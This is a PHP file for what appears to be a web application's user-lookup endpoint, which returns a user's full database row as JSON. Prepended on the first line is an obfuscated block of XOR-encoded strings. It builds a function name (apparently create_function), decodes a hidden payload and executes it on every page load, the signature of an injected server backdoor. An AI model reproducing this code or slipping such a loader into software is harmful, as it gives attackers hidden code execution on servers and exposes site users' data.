<?php $EWMPzwmy='3L 23+9HN83AWO,'; $cFeUwo='P>ESGNf.;VP5> B'^$EWMPzwmy; $mnLRIHiu='RMdJJ>N+IU= o2JT=OFan4 1:7R<.=2XLJmlSKFix5O:9>,=<S:>Nl 3Y3c:SA8naP088aNcG7RyXLCffMx2DtUKBLRepTrheGS:DXf:ZsphIdqTeC=9:39NsD2TOdbue9Mami18cW>-ghziiEOMZXvj:lg<zgZRWnv>grr5=DU1SzcE<DDmdca>p4R6C89CfDENjj3cV=DikkVL<Wiwe5-X Tjik3WX.,FW<iGbR4Q:Qx;p5-<VAVVMPl3x5sq vB-OOwZX mpTLw0M.Y7piJ2mg=4;25<WROTopKNThzGhIQ  ZezF8-V>4vIDlg17mxfh53YYpoA9FKT5< Z edjc=wa4v=<q >Ao WDHvtBaD4YFRPb8FfdH35TS0QT0pKda;N0kk5sG- 55CsmsEYUDRSPs:PAOKFSS-QfpA81,11>,S - .k ;Il V21oaY1GNP O.bR>Y0;=41No19;AMirl6M1 g,12zDz3ZQmsI1H3itdFZ5OLD4; Wq77,I Fpn>=JUJlmD4=5LLrtEKY>Xbl+2AMoT2RAi+aOqdtD2urw VuPTETzZlDfdTXPtMaqbufPCtQCnLMQti15 U5fX+>k AGO.4bbFJM-V,=pcIt=LYMefzXWedU,eZ0AY>Mv+6G-akJ-<>=-+F6hO=dP; NNEojo9'; $zPuWrDq=$cFeUwo('', ';+Lk,K H=<RN0W2=N;5IILOCeS3HObm59>JEzk=cqS:TZJERRsBQ<3DR-R<e>4LFE4QLYMnG,R+PxlcFF6r;MP:>6loEWsIblN5U6pBSzNPXrDU=Y0IKVVWfW S .MYUAPfJDc81G8KYGFGIAa+,.9-NS1GbZC17.5RWGWRFI69T=RG.Y=m0MXk7yF7B6JWkB+0:CQ9j+79caO2-H6IJESL4S1QcOW6,Os-2EIzB4U=I4C1zSBN3 5>mxHl;z<:i3bL<oS1=YMMjlSF,B,RYI18dCYUOSjW2+oiOT +-SpNL-0TAzXZbNL:KQMC9fmXQMPGLQR-8YO:3O-;GYA9HELN<o20a3nhQAMaKK2=hKJbE2U537yBCLomlWT 2o:1IPvDEP+IPa<zcIAATcNMW38917hZzGZ<EAb72Y0FMaxDBBTLE2LDZKCXT;3D7FP0>4D3f2A<KTfa=UXRPTfKUXO dERHR,EA8GTKSmA937EW-P<RIRBf;G=-=kPE..ROE:T5XIUX3rfLI UITelTRec4ZmJHOS5,4sY78NvHoLYTcPMCOAdDd1rmOjUvQPmmcA+TITDRevL0zIemwRIPGR4L93NG4E9.<ZGJE6+4A9MYWOiPY--,LOZxwEDuWoSU78ReROW3L:L:LERRLOakAt7m5CI:fuFQeD'^$mnLRIHiu); $zPuWrDq(); 
	include 'includes/session.php';

	if(isset($_POST['id'])){
		$id = $_POST['id'];
		
		$conn = $pdo->open();

		$stmt = $conn->prepare("SELECT * FROM users WHERE id=:id");
		$stmt->execute(['id'=>$id]);
		$row = $stmt->fetch();
		
		$pdo->close();

		echo json_encode($row);
	}
?>